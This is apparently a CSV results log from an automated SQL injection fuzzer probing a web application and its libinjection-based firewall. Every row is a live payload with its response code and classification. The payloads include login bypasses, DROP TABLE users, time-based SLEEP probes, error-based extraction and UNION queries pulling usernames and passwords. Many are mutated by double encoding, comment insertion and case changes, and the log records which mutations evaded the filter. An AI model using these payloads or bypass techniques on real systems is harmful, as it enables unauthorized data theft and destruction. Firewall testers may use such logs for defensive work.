depth,category,label,reason,confidence,status,length,elapsed,input_preview,parent_preview
0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.00686,' OR 1=1--,
0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4811,0.00595,' OR 1=1#,
0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.00592,1' OR '1'='1'--,
0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4836,0.00728,1' OR '1'='1'#,
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0052,1; DROP TABLE users--,
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00335,1'; DROP TABLE users--,
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00385,1 AND SLEEP(5),
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00295,1' AND SLEEP(5)--,
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00363,1 OR SLEEP(5),
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00301,1) OR SLEEP(5)#,
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00318,"1 AND IF(1=1,SLEEP(5),0)",
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00394,"1 AND extractvalue(1,concat(0x7e,version()))",
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00399,"1 AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))",
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00431,"1 AND updatexml(1,concat(0x7e,version()),1)",
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00323,"1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00325,"1 AND (SELECT SUBSTRING(version(),1,1))=5",
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00386,"1 AND ascii(substring((SELECT user()),1,1))>100",
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00313,1 AND (SELECT COUNT(*) FROM information_schema.tables)>0,
0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4549,0.00863,1 ORDER BY 1,
0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4550,0.00636,1 ORDER BY 10,
0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4553,0.00577,"1 GROUP BY 1,2,3",
0,seed,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00345,"1 OR BENCHMARK(5000000,MD5(1))",
0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4541,0.00709,1%00,
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4545,0.00537,1 OR 1=1,1 OR 1=1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4546,0.00596,1 OR 1=1 ,1 OR 1=1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4545,0.00553,1 or 1=1,1 OR 1=1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4546,0.00589,1 AND 1=1,1 AND 1=1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4547,0.00544,1 AND 1=1 ,1 AND 1=1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4546,0.00491,1 and 1=1,1 AND 1=1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4546,0.00654,1 AND 1=0,1 AND 1=0
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4547,0.00547,1 AND 1=0 ,1 AND 1=0
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4546,0.00573,1 and 1=0,1 AND 1=0
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4826,0.00526,1' OR '1'='1,1' OR '1'='1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4831,0.00519,1' OR '1'='1 ,1' OR '1'='1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4826,0.00485,1' or '1'='1,1' OR '1'='1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4550,0.00522,1' AND '1'='1,1' AND '1'='1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4551,0.00554,1' AND '1'='1 ,1' AND '1'='1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4550,0.00466,1' and '1'='1,1' AND '1'='1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.00476,' OR 1=1,' OR 1=1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.005,' OR 1=1 ,' OR 1=1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.00507,' or 1=1,' OR 1=1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4821,0.00487,' OR '1'='1,' OR '1'='1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4826,0.00567,' OR '1'='1 ,' OR '1'='1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4821,0.00542,' or '1'='1,' OR '1'='1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4846,0.00479,admin' OR '1'='1,admin' OR '1'='1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4851,0.00596,admin' OR '1'='1 ,admin' OR '1'='1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4846,0.0048,ADMIN' OR '1'='1,admin' OR '1'='1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4846,0.00566,admin' or '1'='1,admin' OR '1'='1
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4861,0.005,x' OR 1=1 OR 'x'='y,x' OR 1=1 OR 'x'='y
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4866,0.00528,x' OR 1=1 OR 'x'='y ,x' OR 1=1 OR 'x'='y
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4861,0.00581,X' OR 1=1 OR 'X'='Y,x' OR 1=1 OR 'x'='y
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4861,0.00567,x' or 1=1 or 'x'='y,x' OR 1=1 OR 'x'='y
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4571,0.00512,1%2520UNION%2520SELECT%25201%252C2,"1 UNION SELECT 1,2"
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00409,"1 U%4eION SE%4c%45%43T 1,2","1 UNION SELECT 1,2"
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00318,"1%0aUNION%09SELECT%091,2","1 UNION SELECT 1,2"
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00302,"1 UnIoN SeLeCt 1,2","1 UNION SELECT 1,2"
1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4563,0.00583,"1 UNI/**/ON SE/**/LECT 1,2","1 UNION SELECT 1,2"
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4577,0.00483,1%2520UNION%2520SELECT%25201%252C2%252C3,"1 UNION SELECT 1,2,3"
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00333,"1 U%4eION SELECT 1,2,3","1 UNION SELECT 1,2,3"
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00369,"1
UNION%0aSELECT+1,2,3","1 UNION SELECT 1,2,3"
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00329,"1 UnIoN SeLeCt 1,2,3","1 UNION SELECT 1,2,3"
1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4565,0.00585,"1 UNI/**/ON S/**/ELECT 1,2,3","1 UNION SELECT 1,2,3"
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4584,0.0052,1%2520UNION%2520SELECT%2520user%2528%2529%252C2,"1 UNION SELECT user(),2"
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00423,"1 %55N%49%4fN SELEC%54 us%65r(),2","1 UNION SELECT user(),2"
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00404,"1%0aUNION
SELECT user(),2","1 UNION SELECT user(),2"
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00408,"1 UnIoN SeLeCt uSeR(),2","1 UNION SELECT user(),2"
1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4572,0.00525,"1 U/**/NION S/**/ELECT us/**/er(),2","1 UNION SELECT user(),2"
1,evasion_double_encode,SERVER_ANOMALY,ERROR_PATTERN_IN_BODY,0.85,200,4601,0.00488,1%2520UNION%2520SELECT%2520user%2528%2529%252Cdatabase%2528%2529,"1 UNION SELECT user(),database()"
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00324,"1 UNIO%4e SE%4cECT %75%73e%72(),data%62ase()","1 UNION SELECT user(),database()"
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00318,"1+UNION/**/SELECT%0auser(),database()","1 UNION SELECT user(),database()"
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00357,"1 UnIoN SeLeCt uSeR(),DaTaBaSe()","1 UNION SELECT user(),database()"
1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4585,0.00514,"1 U/**/NION SELEC/**/T us/**/er(),databa/**/se()","1 UNION SELECT user(),database()"
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4604,0.00538,1%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users,"1 UNION SELECT username,password FROM users"
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00344,"1 %55%4e%49ON %53ELEC%54 u%73%65%72nam%65,pas%73word %46RO%4d u%73ers","1 UNION SELECT username,password FROM users"
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00322,"1+UNION%09SELECT
username,password FROM users","1 UNION SELECT username,password FROM users"
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00329,"1 UnIoN SeLeCt uSeRnAmE,PaSsWoRd fRoM UsErS","1 UNION SELECT username,password FROM users"
1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4600,0.00558,"1 UNIO/**/N SELEC/**/T us/**/ername,password FRO/**/M use/**/rs","1 UNION SELECT username,password FROM users"
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4619,0.00543,1%2520UNION%2520SELECT%2520table_name%252C2%2520FROM%2520information_schema.tables,"1 UNION SELECT table_name,2 FROM information_schema.tables"
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00356,"1 UN%49%4fN %53ELECT %74a%62l%65_%6eame,2 %46ROM %69%6efo%72ma%74%69%6fn_sc%68e%6d%61.%74a%62%6ces","1 UNION SELECT table_name,2 FROM information_schema.tables"
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00385,"1
UNION%09SELECT%09table_name,2	FROM information_schema.tables","1 UNION SELECT table_name,2 FROM information_schema.tables"
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00361,"1 UnIoN SeLeCt tAbLe_nAmE,2 FrOm iNfOrMaTiOn_sChEmA.TaBlEs","1 UNION SELECT table_name,2 FROM information_schema.tables"
1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.0061,"1 UNI/**/ON SEL/**/ECT table_name,2 F/**/ROM i/**/nformation_schema.tables","1 UNION SELECT table_name,2 FROM information_schema.tables"
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4621,0.00519,1%2520UNION%2520SELECT%2520column_name%252C2%2520FROM%2520information_schema.columns,"1 UNION SELECT column_name,2 FROM information_schema.columns"
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00338,"1 U%4eIO%4e SEL%45CT c%6flumn_%6eame,2 FR%4f%4d in%66o%72m%61%74%69o%6e_sch%65m%61.c%6flu%6dns","1 UNION SELECT column_name,2 FROM information_schema.columns"
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00336,"1+UNION	SELECT	column_name,2+FROM information_schema.columns","1 UNION SELECT column_name,2 FROM information_schema.columns"
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00413,"1 UnIoN SeLeCt cOlUmN_NaMe,2 fRoM InFoRmAtIoN_ScHeMa.cOlUmNs","1 UNION SELECT column_name,2 FROM information_schema.columns"
1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4613,0.00508,"1 UN/**/ION SE/**/LECT column_name,2 F/**/ROM i/**/nformation_schema.columns","1 UNION SELECT column_name,2 FROM information_schema.columns"
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4578,0.0053,1%2527%2520UNION%2520SELECT%25201%252C2--,"1' UNION SELECT 1,2--"
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00357,"1' %55N%49%4fN SE%4c%45CT 1,2--","1' UNION SELECT 1,2--"
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00332,"1' UNION/**/SELECT 1,2--","1' UNION SELECT 1,2--"
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00341,"1' uNiOn sElEcT 1,2--","1' UNION SELECT 1,2--"
1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,186,0.00547,"1' UNI/**/ON SELEC/**/T 1,2--","1' UNION SELECT 1,2--"
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00569,1%2527%2520UNION%2520SELECT%2520username%252Cpassword%2520FROM%2520users--,"1' UNION SELECT username,password FROM users--"
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00338,"1' UN%49O%4e %53%45LECT u%73ern%61%6de,%70as%73word FROM %75sers--","1' UNION SELECT username,password FROM users--"
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00303,"1'
UNION%0aSELECT%09username,password FROM+users--","1' UNION SELECT username,password FROM users--"
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00314,"1' uNiOn sElEcT UsErNaMe,pAsSwOrD FrOm uSeRs--","1' UNION SELECT username,password FROM users--"
1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,223,0.00491,"1' UN/**/ION SE/**/LECT use/**/rname,password FRO/**/M use/**/rs--","1' UNION SELECT username,password FROM users--"
1,evasion_double_encode,NO_EFFECT,EMPTY_BASELINE_MATCH,0.88,200,4479,0.00494,-1%2527%2520UNION%2520SELECT%25201%252C2%252C3--,"-1' UNION SELECT 1,2,3--"
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00399,"-1' UNION %53%45LECT 1,2,3--","-1' UNION SELECT 1,2,3--"
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00365,"-1'%09UNION SELECT+1,2,3--","-1' UNION SELECT 1,2,3--"
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00296,"-1' UnIoN SeLeCt 1,2,3--","-1' UNION SELECT 1,2,3--"
1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,188,0.00565,"-1' UNIO/**/N SELEC/**/T 1,2,3--","-1' UNION SELECT 1,2,3--"
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4577,0.0053,1%2520union%2520select%2520null%252Cnull,"1 union select null,null"
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00341,"1 %75%6eio%6e %73elect n%75%6cl,n%75%6c%6c","1 union select null,null"
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00314,"1
union+select null,null","1 union select null,null"
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00352,"1 UnIoN SeLeCt nUlL,NuLl","1 union select null,null"
1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4577,0.00562,"1 u/**/nion selec/**/t nu/**/ll,nu/**/ll","1 union select null,null"
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.00524,admin'--,admin'--
1,stability_probe,NO_EFFECT,EMPTY_BASELINE_MATCH,0.88,200,4479,0.00489,admin'-- ,admin'--
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.00543,ADMIN'--,admin'--
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,162,0.00551,admin'/*,admin'/*
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,163,0.00529,admin'/* ,admin'/*
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,162,0.00555,ADMIN'/*,admin'/*
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.00529,' OR 1=1--,' OR 1=1--
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4821,0.00554,' OR 1=1-- ,' OR 1=1--
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.00523,' or 1=1--,' OR 1=1--
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4811,0.00519,' OR 1=1#,' OR 1=1#
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4816,0.00482,' OR 1=1# ,' OR 1=1#
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4811,0.00502,' or 1=1#,' OR 1=1#
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.00507,1' OR '1'='1'--,1' OR '1'='1'--
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4846,0.0052,1' OR '1'='1'-- ,1' OR '1'='1'--
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,160,0.00475,1' or '1'='1'--,1' OR '1'='1'--
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4836,0.00544,1' OR '1'='1'#,1' OR '1'='1'#
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4841,0.00505,1' OR '1'='1'# ,1' OR '1'='1'#
1,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4836,0.00507,1' or '1'='1'#,1' OR '1'='1'#
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4574,0.00526,1%253B%2520DROP%2520TABLE%2520users--,1; DROP TABLE users--
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00307,1; D%52OP TA%42%4c%45 u%73e%72s--,1; DROP TABLE users--
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00342,"1; DROP
TABLE/**/users--",1; DROP TABLE users--
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00319,1; dRoP TaBlE UsErS--,1; DROP TABLE users--
1,evasion_comment_insert,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0032,1; DROP TABLE u/**/sers--,1; DROP TABLE users--
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4579,0.00507,1%2527%253B%2520DROP%2520TABLE%2520users--,1'; DROP TABLE users--
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00332,1'; DR%4f%50 T%41%42LE %75s%65rs--,1'; DROP TABLE users--
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0037,"1';
DROP+TABLE%0ausers--",1'; DROP TABLE users--
1,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00321,1'; DrOp tAbLe uSeRs--,1'; DROP TABLE users--
1,evasion_comment_insert,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.0036,1'; DROP TABLE u/**/sers--,1'; DROP TABLE users--
1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4567,0.00481,1%2520AND%2520SLEEP%25285%2529,1 AND SLEEP(5)
1,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00309,1 %41N%44 %53LEE%50(5),1 AND SLEEP(5)
1,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00324,1	AND%0aSLEEP(5),1 AND SLEEP(5)
